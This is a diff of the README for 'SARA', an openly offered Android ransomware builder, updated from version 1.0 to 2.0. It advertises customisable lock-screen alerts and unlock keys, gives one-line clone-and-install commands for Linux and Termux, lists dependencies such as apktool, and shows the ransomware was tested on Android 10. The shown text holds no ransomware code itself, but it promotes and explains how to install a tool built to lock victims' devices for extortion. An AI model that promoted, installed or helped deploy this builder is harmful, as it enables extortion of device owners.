@@ -1,17 +1,24 @@
-<img title="SIGIT" src="https://img.shields.io/badge/CODENAME%20-SARA-SCRIPT?colorA=grey&colorB=green&style=for-the-badge"> <img title="SARA" src="https://img.shields.io/badge/VERSION%20-1.0-SCRIPT?colorA=grey&colorB=green&style=for-the-badge"> 
+<img title="SARA" src="https://img.shields.io/badge/CODENAME%20-SARA-SCRIPT?colorA=grey&colorB=green&style=for-the-badge"> <img title="SARA" src="https://img.shields.io/badge/VERSION%20-2.0-SCRIPT?colorA=grey&colorB=green&style=for-the-badge"> 
 <img src="https://raw.githubusercontent.com/termuxhackers-id/SARA/main/src/overview.jpg">
 SARA - Simple Android Ransomware Attack
-
+```
+Dear user, I have lost stars & forks in this repository.
+Can you guys help me to get back the lost stars? 😊
+```
 ### Disclaimer
-The author is not responsible for any issues or damage caused by this program.
+The author is not responsible for any loses or damage caused by this program.
 
 ### Features
-User can customize:
+SARA version 1.0
 - ```app_icon``` - custom icon application
 - ```app_name``` - custom name application
 - ```alert_title``` - custom alert title
 - ```alert_desc``` - custom alert description
 - ```key_pass``` - custom key for unlock devices
+SARA version 2.0
+- ```app_icon``` - custom icon application
+- ```app_name``` - custom name application
+- ```app_desc``` - custom desctription (README.txt)
 ### Installation
 Quick installation for Ubuntu, Kali Linux, Darwin (MAC)
 ```bash
@@ -20,17 +27,14 @@ git clone https://github.com/termuxhackers-id/SARA && cd SARA && sudo bash insta
 
 Quick installation for Termux Android (ROOT)
 ````bash
-apt-get install tsu git imagemagick python -y && python3 -m pip install Pillow && git clone https://github.com/R1punk/SARA && cd SARA && tsu && bash installtermux.sh && python3 tehsara.py
+git clone https://github.com/termuxhackers-id/SARA && cd SARA && bash installtermux.sh
 ````
-#### Sara for Termux by [@R1punk](https://github.com/R1punk/SARA)
-Tutorial on Termux Android [watch here](https://youtu.be/poXKCgaBg3c)
-
 ### Dependencies
 - Java
-  - Openjdk 11
+  - Openjdk 17
 - Aapt
 - Apktool
-  - Apktool 2.4.0
+  - Apktool 2.6.1
 - Zipalign
 - Imagemagick
 - Python3
@@ -39,11 +43,10 @@ Tutorial on Termux Android [watch here](https://youtu.be/poXKCgaBg3c)
 
 ### Tools overview
 <img src="https://raw.githubusercontent.com/termuxhackers-id/SARA/main/src/view.jpg"></img>
-Need root access for ```Termux Android```
-
+Tested on Ubuntu Termux & Non-rooted Termux
 ### Ransomware overview
 <img src="https://raw.githubusercontent.com/termuxhackers-id/SARA/main/src/ransomware.jpg"></img>
-Tested on devices ```Android 10```
+Sara Ransomware - version 1.0 ```Tested on Android 10```
 
 ### Output logs
 <img src="https://raw.githubusercontent.com/termuxhackers-id/SARA/main/src/outputlog.jpg"></img>
